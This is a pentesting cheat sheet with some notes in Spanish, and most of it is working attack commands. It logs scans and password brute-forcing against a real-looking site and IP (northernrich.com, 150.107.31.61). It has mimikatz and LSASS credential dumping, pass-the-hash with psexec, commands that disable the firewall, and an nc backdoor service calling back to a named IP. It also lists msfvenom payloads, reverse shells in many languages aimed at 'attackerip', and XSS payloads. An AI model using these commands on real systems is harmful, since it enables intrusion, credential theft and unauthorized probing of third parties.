    sudo nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt

# Port found, found all the ports, but UDP port scanning will be very slow

    sudo nmap -sS -T4 -Pn –top-ports 3674 -oG LiveHost-port-3674 -iL LiveHosts.txt
    sudo nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
    # este comando es super lento...
    sudo nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# Displays the TCP / UDP port

    grep "open" FullTCP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "TCP-PORTS: " $0}'
    grep "open" FullUDP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "UDP-PORTS: " $0}'

# Detect the service version

    sudo nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
    sudo nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
    sudo nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
    # Este comando hace un TCP y UDP scan, udp ports 53,111,137. tcp ports 21-25,80,139,8080. El anterior hace lo mismo pero da warnings.
    sudo nmap -O -sV -sS -sU -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt 

# Nmap to avoid the firewall

# Segmentation
    nmap -f
# Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
    nmap –mtu 24
# Generate random numbers of spoofing
    nmap -D RND:10 [target]
# Manually specify the IP to be spoofed
    nmap -D decoy1,decoy2,decoy3 etc.
# Botnet scanning, first need to find the botnet IP
    nmap -sI [Zombie IP] [Target IP]
# Designated source terminal
    nmap –source-port 80 IP
# Add a random number of data after each scan
    nmap –data-length 25 IP
# MAC address spoofing, you can generate different host MAC address
    nmap –spoof-mac Dell/Apple/3Com IP

# Nmap for Web vulnerability scanning

    cd /usr/share/nmap/scripts/
    wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site www.northernrich.com 
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-1 --script-args vulscandb=scipvuldb.csv www.northernrich.com
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-port80 --script-args vulscandb=scipvuldb.csv -p80 www.northernrich.com
    sudo nmap -PN -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-vulscancorrelation-1 --script-args vulscancorrelation=1 -p80 www.northernrich.com
    sudo nmap -sV -oG northernrich-vulscan-site-script-vuln --script=vuln www.northernrich.com
    sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com

# Web path scanner
    dirsearch -> 
    
    designed to brute force directories and files in webservers.

    As a feature-rich tool, dirsearch gives users the opportunity to perform a complex web content discovering, with many vectors for the wordlist, high     accuracy, impressive performance, advanced connection/request settings, modern brute-force techniques and nice output.

    https://www.kali.org/tools/dirsearch/
    
    > python --version
    Python 3.9.12
    > dirsearch --url=https://www.northernrich.com/en/ --wordlists /usr/share/seclists/Discovery/Web-Content/dirsearch.txt

      _|. _ _  _  _  _ _|_    v0.4.2
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29583

    Output File: /home/kali/.dirsearch/reports/www.northernrich.com/-en-_22-07-04_18-42-46.txt

    Error Log: /home/kali/.dirsearch/logs/errors-22-07-04_18-42-46.log

    Target: https://www.northernrich.com/en/

    [18:42:47] Starting: 
    [18:42:59] 403 -    2KB - /en/.php                                         
    [18:42:59] 200 -   19KB - /en/.                                            
    [18:42:59] 403 -    2KB - /en/.html                                        
    [18:43:12] 403 -    2KB - /en/.htaccess.bak1                               
    [18:43:13] 403 -    2KB - /en/.htaccess.orig                               
    [18:43:13] 403 -    2KB - /en/.htaccess.save
    [18:43:13] 403 -    2KB - /en/.htaccessBAK
    [18:43:13] 403 -    2KB - /en/.htm
    [18:43:13] 403 -    2KB - /en/.htaccessOLD                                 
    [18:43:13] 403 -    2KB - /en/.httr-oauth
    [18:43:13] 403 -    2KB - /en/.htaccess.sample                             
    [18:43:14] 403 -    2KB - /en/.htaccessOLD2                                
    [18:43:21] 403 -    2KB - /en/.php3                                        
    [18:51:45] 200 -   19KB - /en/index.html                                    
    [18:56:05] 200 -   36KB - /en/register.php                                  

    Task Completed 
    
    DirBuster -> Like above, but with a gui
    
    https://www.kali.org/tools/dirbuster/#dirbuster-1
    
    Patator- password guessing attacks

    git clone https://github.com/lanjelot/patator.git /usr/share/patator
    #Probably you will have available the tool in kali...
    # Passwords and users from SecList. /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
    
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt host=150.107.31.61 -x ignore:fgrep='Access denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/john/password.lst host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator smtp_login host=150.107.31.61 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    sudo patator smtp_login host=150.107.31.61 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’

# Use Fierce to brute DNS

# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo. Pendiente!

    # http://ha.ckers.org/fierce/
    https://github.com/mschwager/fierce
    
    ./fierce.pl -dns example.com
    ./fierce.pl –dns example.com –wordlist myWordList.txt

# Use Nikto to scan Web services

    nikto -C all -h http://IP
    nikto -C all -h 150.107.31.61
    
    > nikto -C all -h https://www.northernrich.com/en/
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          150.107.31.61
    + Target Hostname:    www.northernrich.com
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /CN=northernrich.com
                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
    + Start Time:         2022-07-04 18:57:36 (GMT2)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.51 (Debian)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect aga
    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + The site uses SSL and Expect-CT header is not present.
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the conte
    + Retrieved x-powered-by header: PHP/5.6.40-0+deb8u12
    + Hostname 'www.northernrich.com' does not match certificate's names: northernrich.com
    + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5157.
    : Connection refused
    + SCAN TERMINATED:  20 error(s) and 7 item(s) reported on remote host
    + End Time:           2022-07-04 19:08:02 (GMT2) (626 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) teste
    
# WordPress scan Está en kali por defecto.
    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
    ./wpscan --url https://www.northernrich.com/en/ –enumerate p

# HTTP fingerprint identification

    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
    cd httprint_301/linux/
    ./httprint -h http://IP -s signatures.txt
    
    https://www.kali.org/tools/httprint/#httprint-1
    
# Scan with dirb

    Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt)
        
    > dirb https://www.northernrich.com /usr/share/dirb/wordlists/common.txt

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Jul  4 19:09:50 2022
    URL_BASE: https://www.northernrich.com/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: https://www.northernrich.com/ ----
    ==> DIRECTORY: https://www.northernrich.com/admin/                                                
    ==> DIRECTORY: https://www.northernrich.com/api/                                                  
    ==> DIRECTORY: https://www.northernrich.com/assets/                                               
    ==> DIRECTORY: https://www.northernrich.com/backup/                                               
    --> Testing: https://www.northernrich.com/emoticons                                               
    --> Testing: https://www.northernrich.com/employee         
    ...
    
# Scan with Skipfish

# Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.

    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
    
    https://www.kali.org/tools/skipfish/#skipfish-1
    
    > skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o skipfish-northern -u https://www.northernrich.com/en/
    skipfish web application scanner - version 2.10b
    [*] Scan in progress, please stay tuned...

    [+] Copying static resources...                                                                                                                                                                           
    [+] Sorting and annotating crawl nodes: 19                                                                                                                                                                
    [+] Looking for duplicate entries: 19                                                                                                                                                                     
    [+] Counting unique nodes: 12                                                                                                                                                                             
    [+] Saving pivot data for third-party tools...                                                                                                                                                            
    [+] Writing scan description...                                                                                                                                                                           
    [+] Writing crawl tree: 19                                                                                                                                                                                
    [+] Generating summary views...                                                                                                                                                                           
    [+] Report saved to 'skipfish-northern/index.html' [0x1e08a1da].                                                                                                                                          
    [+] This was a great day for science!   

# Use the NC scan

    nc -v -w 1 target -z 1-1000
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

# Unicornscan

# NOTE: Unicornscan is a tool for information gathering and security audits. como si hicieras nmap -p- --open
    
    https://www.kali.org/tools/unicornscan/
    
    sudo us -mTsf -Iv -r 1000 150.107.31.61:a
    
    sudo us -H -msf -Iv 150.107.31.61 -p 1-65535
    ...
    listener statistics 136150 packets recieved 0 packets droped and 0 interface drops
    TCP open                     ftp[   21]         from ns21.appservhosting.com  ttl 128 
    TCP open                     ssh[   22]         from ns21.appservhosting.com  ttl 128 
    TCP open                    smtp[   25]         from ns21.appservhosting.com  ttl 128 
    TCP open                  domain[   53]         from ns21.appservhosting.com  ttl 128 
    TCP open                    http[   80]         from ns21.appservhosting.com  ttl 128 
    TCP open                    pop3[  110]         from ns21.appservhosting.com  ttl 128 
    TCP open                  sunrpc[  111]         from ns21.appservhosting.com  ttl 128 
    TCP open                    imap[  143]         from ns21.appservhosting.com  ttl 128 
    TCP open                   https[  443]         from ns21.appservhosting.com  ttl 128 
    TCP open                     urd[  465]         from ns21.appservhosting.com  ttl 128 
    TCP open              submission[  587]         from ns21.appservhosting.com  ttl 128 
    TCP open                    ftps[  990]         from ns21.appservhosting.com  ttl 128 
    TCP open                   imaps[  993]         from ns21.appservhosting.com  ttl 128 
    TCP open                   pop3s[  995]         from ns21.appservhosting.com  ttl 128 
    TCP open                servexec[ 2021]         from ns21.appservhosting.com  ttl 128 
    TCP open                    down[ 2022]         from ns21.appservhosting.com  ttl 128 
    TCP open           scientia-ssdb[ 2121]         from ns21.appservhosting.com  ttl 128
    
    > sudo us -H -mU -Iv 150.107.31.61 -p 1-65535
    adding 150.107.31.61/32 mode `UDPscan' ports `1-65535' pps 300
    using interface(s) eth0
    scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
    UDP open 192.168.1.49:56700  ttl 128
    UDP open 192.168.85.2:53  ttl 128
    sender statistics 298.6 pps with 65544 packets sent total
    listener statistics 80 packets recieved 0 packets droped and 0 interface drops
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                  domain[   53]         from 192.168.85.2  ttl 128 
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                 unknown[56700]         from 192.168.1.49  ttl 128
    
# Use Xprobe2 to identify the operating system fingerprint

    A Remote active operating system fingerprinting tool.

    sudo xprobe2  -v -r -p tcp:80:open 150.107.31.61

    I can generate a signature.txt file, maybe you can use it with httprint.
    
    sudo xprobe2  -v -r  -F -o /home/kali/Desktop/signature-northernrich.txt  -p tcp:443:open -p tcp:80:open -B 150.107.31.61


    Enumeration of Samba

    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U “” target
    enum4linux target

# Enumerates SNMP

    snmpget -v 1 -c public IP
    snmpwalk -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

# Useful Windows cmd command

    net localgroup Users
    net localgroup Administrators
    search dir/s *.doc
    system(“start cmd.exe /k $cmd”)
    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64

# PuTTY connects the tunnel

    Forward the remote port to the destination address
    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP

# Meterpreter port forwarding

    https://www.offensive-security.com/metasploit-unleashed/portfwd/
    
# Forward the remote port to the destination address
    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
    kali > rdesktop 127.0.0.1:3389

# Enable the RDP service

    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

# Close Windows Firewall
    netsh firewall set opmode disable

Meterpreter VNC/RDP

    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
    run getgui -u admin -p 1234
    run vnc -p 5043

# Use Mimikatz

    Gets the Windows plaintext user name password

    git clone https://github.com/gentilkiwi/mimikatz.git
    mimikatz privilege::debug
    mimikatz sekurlsa::logonPasswords full

Gets a hash value

    git clone https://github.com/byt3bl33d3r/pth-toolkit
    pth-winexe -U hash //IP cmd

    or

    apt-get install freerdp-x11
    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

    or
    
    meterpreter > run post/windows/gather/hashdump
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit
    meterpreter > shell
    
# Use Hashcat to crack passwords    

    hashcat -m 400 -a 0 hash /root/rockyou.txt
    
    https://www.securityartwork.es/2017/02/15/cracking-contrasenas-hashcat/
    
    https://sniferl4bs.com/showcase/
    
    
# Use the NC to fetch Banner information

    nc 150.107.31.61 80
    GET / HTTP/1.1
    Host: 192.168.0.10
    User-Agent: Mozilla/4.0
    Referrer: www.example.com
    <enter>
    <enter>


# Use NC to bounce the shell on Windows

    c:>nc -Lp 31337 -vv -e cmd.exe
    nc 192.168.0.10 31337
    c:>nc example.com 80 -e cmd.exe
    nc -lp 80

    nc -lp 31337 -e /bin/bash
    nc 192.168.0.10 31337
    nc -vv -r(random) -w(wait) 1 150.107.31.61 -z(i/o error) 1-1000

# Look for the SUID/SGID root file

# Locate the SUID root file
    
    sudo find / -user root -perm -4000 -print

# Locate the SGID root file:

    sudo find / -group root -perm -2000 -print

# Locate the SUID and SGID files:

    sudo find / -perm -4000 -o -perm -2000 -print

# Find files that do not belong to any user:

    sudo find / -nouser -print

# Locate a file that does not belong to any user group:

    sudo find / -nogroup -print

# Find soft links and point to:

    find / -type l -ls

# Python shell

    python -c ‘import pty;pty.spawn(“/bin/bash”)’

# Python \ Ruby \ PHP HTTP server

    python2 -m SimpleHTTPServer
    # create a http server in that folder, port 8000 by default
    python3 -m http.server
    # create a http server in that folder, port 80
    python3 -m http.server 80
    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, DocumentRoot => Dir.pwd).start”
    php -S 0.0.0.0:8888

# Gets the PID corresponding to the process

    fuser -nv tcp 80
    fuser -k -n tcp 80

# Use Hydra to crack RDP

    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
    
    xhydra is the gtk gui 

# Mount the remote Windows shared folder

    smbmount //X.X.X.X/c/mnt/remote/ -o username=user,password=pass,rw

# Under Kali compile Exploit

    gcc -m32 -o output32 hello.c
    gcc -m64 -o output hello.c

# Compile Windows Exploit under Kali

    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
    wine mingw-get-setup.exe
    select mingw32-base
    Installation/ Apply changes
    
    cd /home/kali/.wine/drive_c/windows
    
    cd /home/kali/.wine/drive_c/MinGW/bin
    
    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
    wine ability.exe

# NASM command

    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.

    nasm -f bin -o payload.bin payload.asm
    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload

# SSH penetration

    ssh -D 127.0.0.1:1080 -p 22 user@IP
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains commands target
    SSH penetrates from one network to another
    
    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
    proxychains commands target

# Use metasploit for penetration

    TODO
 

# https://www.offensive-security.com/metasploit-unleashed/pivoting/

    meterpreter > ipconfig
    IP Address : 10.1.13.3
    meterpreter > run autoroute -s 10.1.13.0/24
    meterpreter > run autoroute -p
    10.1.13.0 255.255.255.0 Session 1
    meterpreter > Ctrl+Z
    msf auxiliary(tcp) > use exploit/windows/smb/psexec
    msf exploit(psexec) > set RHOST 10.1.13.2
    msf exploit(psexec) > exploit
    meterpreter > ipconfig
    IP Address : 10.1.13.2

# Exploit-DB based on CSV file

    searchsploit –-update 
    searchsploit apache 2.2
    searchsploit “Linux Kernel”
    # para bajar el sploit a tu hdd
        searchsploit -m 
    # para ver el sploit
        searchsploit -x
    
    man searchsploit
    
    It is in kali!
    
    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3

# MSF Payloads

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c

# MSF generates the Meterpreter Shell that bounces under Linux
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell

# MSF build bounce Shell (C Shellcode)
    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c

# MSF generates a bounce Python Shell
    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py

# MSF builds rebound ASP Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp

# MSF generates bounce shells
    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh

# MSF build bounces PHP Shell
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
    add <?php at the beginning
    perl -i~ -0777pe’s/^/<?php \n/’ shell.php

# MSF generates bounce Win Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe

# Linux commonly used security commands

    find / -uid 0 -perm -4000

    find / -perm -o=w

    find / -name ” ” -print
    find / -name “..” -print
    find / -name “. ” -print
    find / -name ” ” -print

    find / -nouser

    lsof +L1

    lsof -i

    arp -a

    getent passwd

    getent group

    for user in $(getent passwd|cut -f1 -d:); do echo “### Crontabs for $user ####”; crontab -u $user -l; done

    cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

    find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
    chattr -i file

# Windows Buffer Overflow exploits 

    msfvenom -p windows/shell_bind_tcp -a x86 –platform win -b “\x00” -f c
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 –platform win -e x86/shikata_ga_nai -b “\x00” -f c

# COMMONLY USED BAD CHARACTERS:

    \x00\x0a\x0d\x20 For http request
    \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)

# Regular command:
    pattern create
    pattern offset (EIP Address)
    pattern offset (ESP Address)
    add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

    !pvefindaddr pattern_create 5000
    !pvefindaddr suggest
    !pvefindaddr nosafeseh


    !mona config -set workingfolder C:\Mona\%p

    !mona config -get workingfolder
    !mona mod
    !mona bytearray -b “\x00\x0a”
    !mona pc 5000
    !mona po EIP
    !mona suggest

# SEH – Structured exception handling

Note: SEH (“Structured Exception Handling”), or structured exception handling, is a powerful processor error or exception weapon provided by the Windows operating system to the programmer.

    # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
    # http://baike.baidu.com/view/243131.htm
    !mona suggest
    !mona nosafeseh
    nseh=”\xeb\x06\x90\x90″ (next seh chain)
    iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)

# ROP (DEP)

Note: ROP (“Return-Oriented Programming”) is a computer security exploit technology that allows an attacker to execute code, such as un-executable memory and code signatures, in a security defense situation.

DEP (“Data Execution Prevention”) is a set of hardware and software technology, in memory, strictly to distinguish between code and data to prevent the data as code execution.

    # https://en.wikipedia.org/wiki/Return-oriented_programming
    # https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
    # https://en.wikipedia.org/wiki/Data_Execution_Prevention
    # http://baike.baidu.com/item/DEP/7694630
    !mona modules
    !mona ropfunc -m *.dll -cpb “\x00\x09\x0a”
    !mona rop -m *.dll -cpb “\x00\x09\x0a” (auto suggest)

# ASLR – Address space format randomization
    # https://en.wikipedia.org/wiki/Address_space_layout_randomization
    !mona noaslr 
# A Tool using Shodan and RTSP to find vulnerable cameras around the world.

    https://github.com/spicesouls/basilisk

# EGG Hunter technology

Egg hunting This technique can be categorized as a “graded shellcode”, which basically supports you to find your actual (larger) shellcode (our “egg”) with a small, specially crafted shellcode, In search of our final shellcode. In other words, a short code executes first, then goes to the real shellcode and executes it. – Making reference to see Ice Forum , more details can be found in the code I add comments link.

    # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
    # http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
    # http://www.fuzzysecurity.com/tutorials/expDev/4.html
    !mona jmp -r esp
    !mona egg -t lxxl
    \xeb\xc4 (jump backward -60)
    buff=lxxllxxl+shell
    !mona egg -t ‘w00t’

# GDB Debugger commonly used commands

    break *_start
    next
    step
    n
    s
    continue
    c

# Data
    checking ‘REGISTERS’ and ‘MEMORY’

# Display the register values: (Decimal,Binary,Hex)
    print /d –> Decimal
    print /t –> Binary
    print /x –> Hex
    O/P :
    (gdb) print /d $eax
    $17 = 13
    (gdb) print /t $eax
    $18 = 1101
    (gdb) print /x $eax
    $19 = 0xd
    (gdb)

# Display the value of a specific memory address
    command : x/nyz (Examine)
    n –> Number of fields to display ==>
    y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
    z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)

# BASH rebound Shell

    bash -i >& /dev/tcp/X.X.X.X/443 0>&1

    exec /bin/bash 0&0 2>&0
    exec /bin/bash 0&0 2>&0

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

    exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/attackerip/4444

    cat <&5 | while read line; do $line 2>&5 >&5; done # or:
    while read line 0<&5; do $line 2>&5 >&5; done

    /bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
    /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1

# PERL rebound Shell

    perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

# Win platform
    perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”attackerip:4444″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’
    perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# RUBY rebound Shell

    ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

# Win platform
    ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”443″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’
    ruby -rsocket -e ‘f=TCPSocket.open(“attackerip”,”443″).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

# PYTHON rebound Shell

    python -c ‘import                                                 socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“attackerip”,443));os.dup2(s.fileno(),0);                 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

# PHP bounce Shell

    php -r ‘$sock=fsockopen(“attackerip”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

# JAVA rebound Shell

    r = Runtime.getRuntime()
    p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
    p.waitFor()

# NETCAT rebound Shell

    nc -e /bin/sh attackerip 4444
    nc -e /bin/sh 192.168.37.10 443

# If the -e parameter is disabled, you can try the following command
    # mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
    /bin/sh | nc attackerip 443
    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you installed the wrong version of netcat, try the following command
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

    TELNET rebound Shell

# If netcat is not available
    mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe

    XTERM rebound Shell

# Enable the X server (: 1 – listen on TCP port 6001)

    apt-get install xnest
    Xnest :1

# Remember to authorize the connection from the target IP
    xterm -display 127.0.0.1:1
# Grant access
    xhost +targetip

# Connect back to our X server on the target machine
    xterm -display attackerip:1
    /usr/openwin/bin/xterm -display attackerip:1
    or
    DISPLAY=attackerip:0 xterm

# XSS

    # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
    (“< iframes > src=http://IP:PORT </ iframes >”)

    <script>document.location=http://IP:PORT</script>

    ‘;alert(String.fromCharCode(88,83,83))//\’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//\”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

    “;!–”<XSS>=&amp;amp;{()}

    <IMG SRC=”javascript:alert(‘XSS’);”>
    <IMG SRC=javascript:alert(‘XSS’)>
    <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>””>
